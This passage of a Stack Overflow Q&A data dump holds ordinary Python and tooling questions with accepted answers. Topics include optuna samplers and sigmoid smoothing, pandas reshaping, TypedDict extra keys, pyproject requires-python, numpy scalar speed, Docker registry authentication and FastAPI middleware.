msg = f\"\"\"Study Name: {header}\\n{'='*30}\n    \n    \u2705 study.best_params: \\n\\t{format_dict(d)}\n    \u2705 metric: {metric_value} \n    \"\"\"\n    return msg\n\n\ndef study_contour_plot(study: optuna.Study, \n                       params: Optional[List[str]]=None, \n                       width: int=560, \n                       height: int=500):\n    \"\"\"\n    Create contour plots for a study, given a list or \n    tuple of two parameter names.\n    \"\"\"\n    if params is None:\n        params = [\"dv\", \"vc\"]\n    fig = optuna.visualization.plot_contour(study, params=params)\n    fig.update_layout(\n        title=f'Contour Plot: {study.study_name} ({params[0]}, {params[1]})', \n        autosize=False,\n        width=width, \n        height=height,\n        margin=dict(l=65, r=50, b=65, t=90))\n    fig.show()\n\n\nbounds = [(0.2, 4), (300, 600), (0, 1000), (0, 1000)]\nparam_names = PARAM_NAMES # [\"ev\", \"bv\", \"vc\", \"dv\",]\npobjective = partial(objective, bounds=bounds)\n\n# Create an empty dict to contain \n# various subsequent studies.\nstudies = dict()\n\nOptuna comes with a few different types of Samplers. Samplers provide the strategy of how optuna is going to sample points from the parametr-space and evaluate the objective function.\n\nhttps://optuna.readthedocs.io/en/stable/reference/samplers.html\n\nB.1 Use TPESampler\nfrom optuna.samplers import TPESampler\n\nsampler = TPESampler(seed=42)\n\nstudy_name = \"TPESampler\"\nstudies[study_name] = optimize(\n    pobjective, \n    sampler=sampler, \n    n_trials=100, \n    study_name=study_name,\n)\n\n# Study Name: TPESampler\n# ==============================\n#    \n#     \u2705 study.best_params: \n#   {'ev': 1.6233, 'bv': 585.2143, 'vc': 731.9939, 'dv': 598.6585}\n#     \u2705 metric: -0.0 \n\nB.2. Use GridSampler\nGridSampler requires a parameter search grid. Here we are using the following search_space.\n\nfrom optuna.samplers import GridSampler\n\n# create search-space\nsearch_space = make_param_grid(bounds=bounds, num_points=10, as_dict=True)\n\nsampler = GridSampler(search_space)\n\nstudy_name = \"GridSampler\"\nstudies[study_name] = optimize(\n    pobjective, \n    sampler=sampler, \n    n_trials=2000, \n    study_name=study_name,\n)\n\n# Study Name: GridSampler\n# ==============================\n#    \n#     \u2705 study.best_params: \n#   {'ev': 0.2, 'bv': 500.0, 'vc': 222.2222, 'dv': 0.0}\n#     \u2705 metric: -88.33333333333337 \n\nB.3. Use RandomSampler\nfrom optuna.samplers import RandomSampler\n\nsampler = RandomSampler(seed=42)\n\nstudy_name = \"RandomSampler\"\nstudies[study_name] = optimize(\n    pobjective, \n    sampler=sampler, \n    n_trials=300, \n    study_name=study_name,\n)\n\n# Study Name: RandomSampler\n# ==============================\n#    \n#     \u2705 study.best_params: \n#   {'ev': 1.6233, 'bv': 585.2143, 'vc': 731.9939, 'dv': 598.6585}\n#     \u2705 metric: -0.0 \n\nC. Dummy Data\nFor the sake of reproducibility, I am keeping a record of the dummy data used here.\nimport pandas as pd\nimport numpy as np\nfrom scipy import optimize\n\ncols = {\n    'Dividend2': [9390, 7448, 177], \n    'Probability': [341, 376, 452], \n    'EV': [0.53, 0.60, 0.55], \n    'Dividend': [185, 55, 755], \n    'EV2': [123, 139, 544],\n}\n\ndf = pd.DataFrame(cols)\n\ndef myFunc(params):\n    \"\"\"myFunc metric.\"\"\"\n    (ev, bv, vc, dv) = params\n    df['Number'] = np.where(df['Dividend2'] <= vc, 1, 0) \\\n                    + np.where(df['EV2'] <= dv, 1, 0)\n    df['Return'] =  np.where(\n        df['EV'] <= ev, 0, np.where(\n            df['Probability'] >= bv, 0, df['Number'] * df['Dividend'] - (vc + dv)\n        )\n    )\n    return -1 * (df['Return'].sum())\n\nb1 = [(0.2,4), (300,600), (0,1000), (0,1000)]\nstart = [0.2, 600, 1000, 1000]\nresult = optimize.minimize(fun=myFunc, bounds=b1, x0=start)\nprint(result)\n\nC.1. An Observation\nSo, it seems at first glance that the code executed properly and did not throw any error. It says it had success in finding the minimized solution.\n      fun: -0.0\n hess_inv: \n      jac: array([0., 0., 3., 3.])\n  message: b'CONVERGENCE: NORM_OF_PROJECTED_GRADIENT_<=_PGTOL' # \ud83d\udca1\n     nfev: 35\n      nit: 2\n   status: 0\n  success: True\n        x: array([2.e-01, 6.e+02, 0.e+00, 0.e+00]) # \ud83d\udd25\n\nA close observation reveals that the solution (see \ud83d\udd25) is no different from the starting point [0.2, 600, 1000, 1000]. So, seems like nothing really happened and the algorithm just finished prematurely?!!\nNow look at the message above (see \ud83d\udca1). If we run a google search on this, you could find something like this:\n\nSummary\n\nb'CONVERGENCE: NORM_OF_PROJECTED_GRADIENT_\nIf the loss-landscape does not have a smoothely changing topography, the gradient descent algorithms will soon find that from one iteration to the next, there isn't much change happening and hence, will terminate further seeking. Also, if the loss-landscape is rather flat, this could see similar fate and get early-termination.\n\n\nscipy-optimize-minimize does not perform the optimization - CONVERGENCE: NORM_OF_PROJECTED_GRADIENT_\n\n\n\nD. Making the Loss Landscape Smoother\nA binary evaluation of value = 1 if x>5 else 0 is essentially a step-function that assigns 1 for all values of x that are greater than 5 and 0 otherwise. But this introduces a kink - a discontinuity in smoothness and this could potentially introduce problems in traversing the loss-landscape.\nWhat if we use a sigmoid function to introduce some smoothness?\n\n\n\n\n# Define sigmoid function\ndef sigmoid(x):\n    \"\"\"Sigmoid function.\"\"\"\n    return 1 / (1 + np.exp(-x))\n\nFor the above example, we could modify it as follows.\n\n\n\n\nYou can additionally introduce another factor (gamma: \u03b3) as follows and try to optimize it to make the landscape smoother. Thus by controlling the gamma factor, you could make the function smoother and change how quickly it changes around x = 5\n\n\n\n\n\nThe above figure is created with the following code-snippet.\nimport matplotlib.pyplot as plt\n\n%matplotlib inline \n%config InlineBackend.figure_format = 'svg' # 'svg', 'retina' \nplt.style.use('seaborn-white')\n\ndef make_figure(figtitle: str=\"Sigmoid Function\"):\n    \"\"\"Make the demo figure for using sigmoid.\"\"\"\n\n    x = np.arange(-20, 20.01, 0.01)\n    y1 = sigmoid(x)\n    y2 = sigmoid(x - 5)\n    y3 = sigmoid((x - 5)/3)\n    y4 = sigmoid((x - 5)/0.3)\n    fig, ax = plt.subplots(figsize=(10,5))\n    plt.sca(ax)\n    plt.plot(x, y1, ls=\"-\", label=\"$\\sigma(x)$\")\n    plt.plot(x, y2, ls=\"--\", label=\"$\\sigma(x - 5)$\")\n    plt.plot(x, y3, ls=\"-.\", label=\"$\\sigma((x - 5) / 3)$\")\n    plt.plot(x, y4, ls=\":\", label=\"$\\sigma((x - 5) / 0.3)$\")\n    plt.axvline(x=0, ls=\"-\", lw=1.3, color=\"cyan\", alpha=0.9)\n    plt.axvline(x=5, ls=\"-\", lw=1.3, color=\"magenta\", alpha=0.9)\n    plt.legend()\n    plt.title(figtitle)\n    plt.show()\n\nmake_figure()\n\nD.1. Example of Metric Smoothing\nThe following is an example of how you could apply function smoothing.\nfrom functools import partial\n\ndef sig(x, gamma: float=1.):\n    return sigmoid(x/gamma)\n\ndef myFunc3(params, gamma: float=0.5):\n    \"\"\"myFunc metric v3 with smoother metric.\"\"\"\n    (ev, bv, vc, dv) = params\n    _sig = partial(sig, gamma=gamma)\n    df['Number'] = _sig(x = -(df['Dividend2'] - vc)) * 1 \\\n                    + _sig(x = -(df['EV2'] - dv)) * 1\n    df['Return'] = (\n        _sig(x = df['EV'] - ev) \n        * _sig(x = -(df['Probability'] - bv))\n        * _sig(x = df['Number'] * df['Dividend'] - (vc + dv))\n    )\n    return -1 * (df['Return'].sum())\n\n"
}
{
    "Id": 72871480,
    "PostTypeId": 1,
    "Title": "When should a static method be a function?",
    "Body": "I am writing a class for an image processing algorithm which has some methods, and notably a few static methods. My IDE keeps telling me to convert static methods to function which leads me to the following question:\nWhen should a static method be turned into a function? When shouldn't it?\n",
    "AcceptedAnswerId": 73039365,
    "AcceptedAnswer": "There are no set rules in python regarding this decision, but there are style-guides defined e.g. by companies that look to solve the ambiguity of when to use what. One popular example of this would be the Google Python Style Guide:\n\nNever use staticmethod unless forced to in order to integrate with an API defined in an existing library. Write a module level function instead.\n\nMy guess is, that your IDE follows this stance of a hard no against the staticmethod. If you decide, that you still want to use staticmethods, you can try to disable the warning by adding # noqa as a comment on the line where the warning is shown. Or you can look in your IDE for a setting to disable this kind of warning globally.\nBut this is only one opinion. There are some, that do see value in using staticmethods (staticmethod considered beneficial, Why Python Developers Should Use @staticmethod and @classmethod), and there are others that argue against the usage of staticmethods (Thoughts On @staticmethod Usage In Python, @staticmethod considered a code smell)\nAnother quote that is often cited in this discussion is from Guido van Rossum (creator of Python):\n\nHonestly, staticmethod was something of a mistake -- I was trying to\ndo something like Java class methods but once it was released I found\nwhat was really needed was classmethod. But it was too late to get rid\nof staticmethod.\n\n\nI have compiled a list of arguments that I found, without any evaluation or order.\nPro module-level function:\n\nStaticmethod lowers the cohesion of the class it is in as it is not using any of the attributes the class provides.\n\nTo call the staticmethod any other module needs to import the whole class even if you just want to use that one method.\n\nStaticmethod binds the method to the namespace of the class which makes it longer to write SomeWhatDescriptiveClassName.method instead of method and more work to refactor code if you change the class.\n\nEasier reuse of method in other classes or contexts.\n\nThe call signature of a staticmethod is the same as that of a classmethod or instancemethod. This masks the fact that the staticmethod does not actually read or modify any object information especially when being called from an instance. A module-level function makes this explicit.\n\n\nPro staticmethod:\n\nBeing bound by an API your class has to work in, it can be the only valid option.\n\nPossible usage of polymorphism for the method. Can overwrite the staticmethod in a subclass to change behaviour.\n\nGrouping a method directly to a class it is meant to be used with.\n\nEasier to refactor between classmethod, instancemethod and staticmethod compared to module-level functions.\n\nHaving the method under the namespace of the class can help with reducing possible namespace-collisions inside your module and reducing the namespace of your module overall.\n\n\nAs I see it, there are no strong arguments for or against the staticmethod (except being bound by an API). So if you work in an organisation that provides a code standard to follow, just do that. Else it comes down to what helps you best to structure your code for maintainability and readability, and to convey the message of what your code is meant to do and how it is meant to be used.\n"
}
{
    "Id": 73067450,
    "PostTypeId": 1,
    "Title": "Get row values as column values",
    "Body": "I have a single row data-frame like below\nNum     TP1(USD)    TP2(USD)    TP3(USD)    VReal1(USD)     VReal2(USD)     VReal3(USD)     TiV1 (EUR)  TiV2 (EUR)  TiV3 (EUR)  TR  TR-Tag\nAA-24   0       700     2100    300     1159    2877    30       30     47      10  5\n\nI want to get a dataframe like the one below\nID  Price   Net     Range\n1   0       300     30\n2   700     1159    30\n3   2100    2877    47\n\nThe logic here is that\na. there will be 3 columns names that contain TP/VR/TV. So in the ID, we have 1, 2 & 3 (these can be generated by extracting the value from the column names or just by using a range to fill)\nb. TP1 value goes into first row of column 'Price',TP2 value goes into second row of column 'Price' & so on\nc. Same for VR & TV. The values go into 'Net' & 'Range columns\nd. Columns 'Num', 'TR'  & 'TR=Tag' are not relevant for the result.\nI tried df.filter(regex='TP').stack(). I get all the 'TP' column & I can access individual values be index ([0],[1],[2]). I could not get all of them into a column directly.\nI also wondered if there may be a easier way of doing this.\n",
    "AcceptedAnswerId": 73067635,
    "AcceptedAnswer": "Assuming 'Num' is a unique identifier, you can use pandas.wide_to_long:\npd.wide_to_long(df, stubnames=['TP', 'VR', 'TV'], i='Num', j='ID')\n\nor, for an output closer to yours:\nout = (pd\n .wide_to_long(df, stubnames=['TP', 'VR', 'TV'], i='Num', j='ID')\n .reset_index('ID')\n .drop(columns=['TR', 'TR-Tag'])\n .rename(columns={'TP': 'Price', 'VR': 'Net', 'TV': 'Range'})\n )\n\noutput:\n       ID  Price   Net  Range\nNum                          \nAA-24   1      0   300     30\nAA-24   2    700  1159     30\nAA-24   3   2100  2877     47\n\nupdated answer\nout = (pd\n .wide_to_long(df.set_axis(df.columns.str.replace(r'\\(USD\\)$', '', regex=True),\n                           axis=1),\n               stubnames=['TP', 'VReal', 'TiV'], i='Num', j='ID')\n .reset_index('ID')\n .drop(columns=['TR', 'TR-Tag'])\n .rename(columns={'TP': 'Price', 'VReal': 'Net', 'TiV': 'Range'})\n )\n\noutput:\n       ID  Price   Net  Range\nNum                          \nAA-24   1      0   300     30\nAA-24   2    700  1159     30\nAA-24   3   2100  2877     47\n\n"
}
{
    "Id": 71802758,
    "PostTypeId": 1,
    "Title": "When using slots, why does dir(type) have no __dict__ attribute?",
    "Body": "I'm trying to understand slots. Therefore, I have written a little script with two classes, one using slots and one not.\nclass A:\n    def __init__(self, name):\n        self.name = name\n\n    def getName(self):\n        return self.name\n\nclass C:\n    __slots__ = \"name\"\n\n    def __init__(self, name):\n        self.name = name\n\n    def getName(self):\n        return self.name\n\nWhen I use the dir() on type A and on an object of type A, the attribute __dict__ appears in the result list, as expected.\ndir(A)\n['__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__get__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', 'getName']\n\ndir(A(\"test\"))\n['__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__get__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', 'getName', 'name']\n\nIf I use type C I get\nprint(dir(C))\n['__class__', '__delattr__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__slots__', '__str__', '__subclasshook__', 'classAttributeC', 'getName', 'name']\n\nprint(dir(C(\"test\")))\n['__class__', '__delattr__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__slots__', '__str__', '__subclasshook__', 'classAttributeC', 'getName', 'name']\n\nNo attribute __dict__ in the results list for dir(C(\"test\")), as expected but also no attribute __dict__ for dir(C).\nWhy isn't the attribute in the results list when I can call C.__dict__ and get the following output?\n{'__module__': '__main__', 'classAttributeC': 9999, '__slots__': 'name', '__init__': , 'getName': , 'name': , '__doc__': None}\n\n",
    "AcceptedAnswerId": 71803126,
    "AcceptedAnswer": "Since you don't override __dir__ here, in each case here it will resolve in the MRO to type.__dir__(A) or type.__dir__(C). So we look at the default implementation of __dir__ for types, here in Objects/typeobject.c\n/* __dir__ for type objects: returns __dict__ and __bases__.\n   We deliberately don't suck up its __class__, as methods belonging to the\n   metaclass would probably be more confusing than helpful.\n*/\nstatic PyObject *\ntype___dir___impl(PyTypeObject *self)\n{\n    PyObject *result = NULL;\n    PyObject *dict = PyDict_New();\n\n    if (dict != NULL && merge_class_dict(dict, (PyObject *)self) == 0)\n        result = PyDict_Keys(dict);\n\n    Py_XDECREF(dict);\n    return result;\n}\n\nThe bases are the same (object,), so there is your answer in the __dict__:\n>>> \"__dict__\" in A.__dict__\nTrue\n>>> \"__dict__\" in C.__dict__\nFalse\n\nSo, types without slots implement a __dict__ descriptor, but types which implement slots don't - and you just get a __dict__ implementation from above:\n>>> inspect.getattr_static(A, \"__dict__\")\n\n>>> inspect.getattr_static(C, \"__dict__\")\n\n\n"
}
{
    "Id": 71814658,
    "PostTypeId": 1,
    "Title": "Python typing: Does TypedDict allow additional / extra keys?",
    "Body": "Does typing.TypedDict allow extra keys? Does a value pass the typechecker, if it has keys which are not present on the definition of the TypedDict?\n",
    "AcceptedAnswerId": 71814659,
    "AcceptedAnswer": "It depends.\nPEP-589, the specification of TypedDict, explicitely forbids extra keys:\n\nExtra keys included in TypedDict object construction should also be caught. In this example, the director key is not defined in Movie and is expected to generate an error from a type checker:\nm: Movie = dict(\n      name='Alien',\n      year=1979,\n      director='Ridley Scott')  # error: Unexpected key 'director'\n\n\n[highlighting by me]\nThe typecheckers mypy, pyre, pyright implement this according to the specification.\nHowever, it is possible that a value with extra keys is accepted. This is because subtyping of TypedDicts is allowed, and the subtype might implement the extra key. PEP-589 only forbids extra keys in object construction, i.e. in literal assignment. As any value that complies with a subtype is always deemed to comply with the parent type and can be upcasted from the subtype to the parent type, an extra key can be introduced through a subtype:\nfrom typing import TypedDict\n\nclass Movie(TypedDict):\n    name: str\n    year: int\n\nclass MovieWithDirector(Movie):\n    director: str\n\n\n# This is illegal:\nmovie: Movie = {\n    'name': 'Ash is purest white', \n    'year': 2018, \n    'director': 'Jia Zhangke',\n}    \n\n# This is legal:\nmovie_with_director: MovieWithDirector = {\n    'name': 'Ash is purest white', \n    'year': 2018, \n    'director': 'Jia Zhangke',\n}\n\n# This is legal, MovieWithDirector is a subtype of Movie\nmovie: Movie = movie_with_director  \n\nIn the example above, we see that the same value can sometimes be considered complying with Movie by the typing system, and sometimes not.\nAs a consequence of subtyping, typing a parameter as a certain TypedDict is not a safeguard against extra keys, because they could have been introduced through a subtype.\nIf your code is sensitive with regard to the presence of extra keys (for instance, if it makes use of param.keys(), param.values() or len(param) on the TypedDict parameter param), this could lead to problems when extra keys are present. A solution to this problem is to either handle the exceptional case that extra keys are actually present on the parameter or to make your code insensitive against extra keys.\nIf you want to test that your code is robust against extra keys, you cannot simply add a key in the test value:\ndef some_movie_function(movie: Movie):\n    # ...\n\ndef test_some_movie_function():\n    # this will not be accepted by the type checker:\n    result = some_movie_function({\n        'name': 'Ash is purest white', \n        'year': 2018, \n        'director': 'Jia Zhangke',\n        'genre': 'drama',\n    })    \n\nWorkarounds are to either make the type checkers ignore the line or to create a subtype for your test, introducing the extra keys only for your test:\nclass ExtendedMovie(Movie):\n     director: str\n     genre: str\n\n\ndef test_some_movie_function():\n    extended_movie: ExtendedMovie = {\n        'name': 'Ash is purest white', \n        'year': 2018, \n        'director': 'Jia Zhangke',\n        'genre': 'drama',\n    }\n\n    result = some_movie_function(test_some_movie_function)\n    # run assertions against result\n} \n\n"
}
{
    "Id": 72373093,
    "PostTypeId": 1,
    "Title": "How to define \"python_requires\" in pyproject.toml using setuptools?",
    "Body": "Setuptools allows you to specify the minimum python version as such:\nfrom setuptools import setup\n\n[...]\n\nsetup(name=\"my_package_name\",\n      python_requires='>3.5.2',\n      [...]\n\n\nHowever, how can you do this with the pyproject.toml? The following two things did NOT work:\n[project]\n...\n# ERROR: invalid key \npython_requires = \">=3\"\n\n# ERROR: no matching distribution found\ndependencies = [\"python>=3\"]\n\n",
    "AcceptedAnswerId": 72462723,
    "AcceptedAnswer": "According to PEP 621, the equivalent field in the [project] table is requires-python.\nMore information about the list of valid configuration fields can be found in: https://packaging.python.org/en/latest/specifications/declaring-project-metadata/.\nThe equivalent pyproject.toml of your example would be:\n[project]\nname = \"my_package_name\"\nrequires-python = \">3.5.2\"\n...\n\n"
}
{
    "Id": 71850031,
    "PostTypeId": 1,
    "Title": "Py Polars: How to filter using 'in' and 'not in' like in SQL",
    "Body": "How can I achieve the equivalents of SQL's IN and NOT IN?\nI have a list with the required values. Here's the scenario:\nimport pandas as pd\nimport polars as pl\nexclude_fruit = [\"apple\", \"orange\"]\n\ndf = pl.DataFrame(\n    {\n        \"A\": [1, 2, 3, 4, 5, 6],\n        \"fruits\": [\"banana\", \"banana\", \"apple\", \"apple\", \"banana\", \"orange\"],\n        \"B\": [5, 4, 3, 2, 1, 6],\n        \"cars\": [\"beetle\", \"audi\", \"beetle\", \"beetle\", \"beetle\", \"frog\"],\n        \"optional\": [28, 300, None, 2, -30, 949],\n    }\n)\ndf.filter(~pl.select(\"fruits\").str.contains(exclude_fruit))\ndf.filter(~pl.select(\"fruits\").to_pandas().isin(exclude_fruit))\ndf.filter(~pl.select(\"fruits\").isin(exclude_fruit))\n\n",
    "AcceptedAnswerId": 71850319,
    "AcceptedAnswer": "You were close.\ndf.filter(~pl.col('fruits').is_in(exclude_fruit))\n\nshape: (3, 5)\n\u250c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 A   \u2506 fruits \u2506 B   \u2506 cars   \u2506 optional \u2502\n\u2502 --- \u2506 ---    \u2506 --- \u2506 ---    \u2506 ---      \u2502\n\u2502 i64 \u2506 str    \u2506 i64 \u2506 str    \u2506 i64      \u2502\n\u255e\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561\n\u2502 1   \u2506 banana \u2506 5   \u2506 beetle \u2506 28       \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 2   \u2506 banana \u2506 4   \u2506 audi   \u2506 300      \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 5   \u2506 banana \u2506 1   \u2506 beetle \u2506 -30      \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n"
}
{
    "Id": 71858905,
    "PostTypeId": 1,
    "Title": "Does urllib3 support HTTP/2 Requests? Will it?",
    "Body": "I know the following about various python HTTP libraries:\n\nRequests does not support HTTP/2 requests.\nHyper does support HTTP/2 requests, but is archived as of early 2021 and wouldn't be a good choice for new projects.\nHTTPX does support HTTP/2, but this support is optional, requires installing extra dependencies, and comes with some caveats about rough edges.\nAIOHTTP does not support HTTP2 yet (as of mid April 2022).\n\nThe focus of this project is also not solely on being a client -- this package also includes a server.\n\n\n\nThe other major HTTP request library I'm aware of is urllib3. This is what OpenAPI Generator uses by default when generating python client libraries.\nMy Questions are:\nCan urrlib3 be configured to make HTTP/2 requests?\nI cannot find any information on http2 support in the documentation, and through my testing of a generated OpenAPI client, all requests are HTTP/1.1. If the answer is no currently, are the maintainers planning HTTP/2 support? I cannot find any evidence of this in the project's open issues.\n",
    "AcceptedAnswerId": 71874365,
    "AcceptedAnswer": "I asked about this in the urllib3 discord, and got an answer from one of the maintainers that corroborates what Tim Roberts commented;\n\nProper HTTP/2 implementations require async/await to take advantage of the main different feature in HTTP/2, which is making requests in parallel.\nurllib3 in particular is not planning to support this because it'll in general require a rewrite.\n\n"
}
{
    "Id": 73062386,
    "PostTypeId": 1,
    "Title": "Adding single integer to numpy array faster if single integer has python-native int type",
    "Body": "I add a single integer to an array of integers with 1000 elements. This is faster by 25% when I first cast the single integer from numpy.int64 to the python-native int.\nWhy? Should I, as a general rule of thumb convert the single number to native python formats for single-number-to-array operations with arrays of about this size?\nNote: may be related to my previous question Conjugating a complex number much faster if number has python-native complex type.\nimport numpy as np\n\nnnu = 10418\nnnu_use = 5210\na = np.random.randint(nnu,size=1000)\nb = np.random.randint(nnu_use,size=1)[0]\n\n%timeit a + b                            # --> 3.9 \u00b5s \u00b1 19.9 ns per loop (mean \u00b1 std. dev. of 7 runs, 100000 loops each)\n%timeit a + int(b)                       # --> 2.87 \u00b5s \u00b1 8.07 ns per loop (mean \u00b1 std. dev. of 7 runs, 100000 loops each)\n\n\nNote that the speed-up can be enormous (factor 50) for scalar-to-scalar-operations as well, as seen below:\nnp.random.seed(100)\n\na = (np.random.rand(1))[0]\na_native = float(a)\nb = complex(np.random.rand(1)+1j*np.random.rand(1))\nc = (np.random.rand(1)+1j*np.random.rand(1))[0]\nc_native = complex(c)\n\n%timeit a * (b - b.conjugate() * c)                # 6.48 \u00b5s \u00b1 49.7 ns per loop (mean \u00b1 std. dev. of 7 runs, 100000 loops each)\n%timeit a_native * (b - b.conjugate() * c_native)  # 283 ns \u00b1 7.78 ns per loop (mean \u00b1 std. dev. of 7 runs, 1000000 loops each)\n%timeit a * b                                      # 5.07 \u00b5s \u00b1 17.7 ns per loop (mean \u00b1 std. dev. of 7 runs, 100000 loops each)\n%timeit a_native * b                               # 94.5 ns \u00b1 0.868 ns per loop (mean \u00b1 std. dev. of 7 runs, 10000000 loops each)\n\n\nUpdate: Could it be that the latest numpy release fixes the speed difference? The release notes of numpy 1.23 mention that scalar operations are now much faster, see https://numpy.org/devdocs/release/1.23.0-notes.html#performance-improvements-and-changes and https://github.com/numpy/numpy/pull/21188. I am using python 3.7.6, numpy 1.21.2.\n",
    "AcceptedAnswerId": 73070306,
    "AcceptedAnswer": "On my Windows PC with CPython 3.8.1, I get:\n[Old] Numpy 1.22.4:\n - First test: 1.65 \u00b5s VS 1.43 \u00b5s\n - Second:     2.03 \u00b5s VS 0.17 \u00b5s\n\n[New] Numpy 1.23.1:\n - First test: 1.38 \u00b5s VS 1.24 \u00b5s    <----  A bit better than Numpy 1.22.4\n - Second:     0.38 \u00b5s VS 0.17 \u00b5s    <----  Much better than Numpy 1.22.4\n\n\nWhile the new version of Numpy gives a good boost, native type should always be faster than Numpy ones with the (default) CPython interpreter. Indeed, the interpreter needs to call C function of Numpy. This is not needed with native types. Additionally, the Numpy checks and wrapping is not optimal but Numpy is not designed for fast scalar computation in the first place (though the overhead was previously not reasonable). In fact, scalar computations are very inefficient and the interpreter prevent any fast execution.\nIf you plan to do many scalar operation you need to use a natively compiled code, possibly using Cython, Numba, or even a raw C/C++ module. Note that Cython do not optimize/inline Numpy calls but can operate on native types faster. A native code can do this certainly in one or even two order of magnitude less time.\nNote that in the first case, the path in Numpy functions is not the same and Numpy does additional check that are a bit more expensive then the value is not a CPython object. Still, it should be a constant overhead (and now relatively small). Otherwise, it would be a bug (and should be reported).\nRelated: Why is np.sum(range(N)) very slow?\n"
}
{
    "Id": 72251787,
    "PostTypeId": 1,
    "Title": "Permission \"artifactregistry.repositories.downloadArtifacts\" denied on resource",
    "Body": "While the artifact repository was successfully creating, running a docker push to push the image to the google artifact registry fails with a permissions error even after granting all artifact permissions to the accounting I am using on gcloud cli.\nCommand used to push image:\ndocker push us-central1-docker.pkg.dev/project-id/repo-name:v2\n\nError message:\nThe push refers to repository [us-central1-docker.pkg.dev/project-id/repo-name]\n6f6f4a472f31: Preparing\nbc096d7549c4: Preparing\n5f70bf18a086: Preparing\n20bed28d4def: Preparing\n2a3255c6d9fb: Preparing\n3f5d38b4936d: Waiting\n7be8268e2fb0: Waiting\nb889a93a79dd: Waiting\n9d4550089a93: Waiting\na7934564e6b9: Waiting\n1b7cceb6a07c: Waiting\nb274e8788e0c: Waiting\n78658088978a: Waiting\ndenied: Permission \"artifactregistry.repositories.downloadArtifacts\" denied on resource \"projects/project-id/locations/us-central1/repositories/repo-name\" (or it may not exist)\n\n\n\n",
    "AcceptedAnswerId": 72255017,
    "AcceptedAnswer": "I was able to recreate your use case. This happens when you are trying to push an image on a repository in which its specific hostname (associated with it's repository location) is not yet  added to the credential helper configuration for authentication. You may refer to this Setting up authentication for Docker  as also provided by @DazWilkin in the comments for more details.\nIn my example, I was trying to push an image on a repository that has a location of us-east1 and got the same error since it is not yet added to the credential helper configuration.\n\nAnd after I ran the authentication using below command (specifically for us-east1 since it is the location of my repository), the image was successfully pushed:\ngcloud auth configure-docker us-east1-docker.pkg.dev\n\n\nQUICK TIP: You may  get your authentication command specific for your repository when you open your desired repository in the console, and then click on the SETUP INSTRUCTIONS.\n\n"
}
{
    "Id": 71187944,
    "PostTypeId": 1,
    "Title": "dlopen: libcrypt.so.1: cannot open shared object file: No such file or directory",
    "Body": "I use EndeavourOS and have updated my system on February 17 2022 using\nsudo pacman -Syu\n\nEversince, when I run docker-compose, I get this error message:\n\n[4221] Error loading Python lib '/tmp/_MEIgGJQGW/libpython3.7m.so.1.0': dlopen: libcrypt.so.1: cannot open shared object file: No such file or directory\n\nSome forum threads suggested to reinstall docker-compose, which I did. I tried the following solution, but both without success:\nPython3.7: error while loading shared libraries: libpython3.7m.so.1.0\nHow can I resolve this issue?\n",
    "AcceptedAnswerId": 72563653,
    "AcceptedAnswer": "The underlying issue here is that you use docker-compose instead of docker compose, which are two different binaries. docker-compose is also known as V1, and is deprecated since April 26, 2022. Since then, it does not receive updates or patches, other than high-severity security patches.\nSo, to fix your issue, use docker compose instead of docker-compose. If you compare docker compose version and docker-compose version, you will see that this uses the newer docker compose and runs without an issue.\n"
}
{
    "Id": 71882419,
    "PostTypeId": 1,
    "Title": "FastAPI - How to get the response body in Middleware",
    "Body": "Is there any way to get the response content in a middleware?\nThe following code is a copy from here.\n@app.middleware(\"http\")\nasync def add_process_time_header(request: Request, call_next):\n    start_time = time.time()\n\n    response = await call_next(request)\n\n    process_time = time.time() - start_time\n    response.headers[\"X-Process-Time\"] = str(process_time)\n    return response\n\n",
    "AcceptedAnswerId": 71883126,
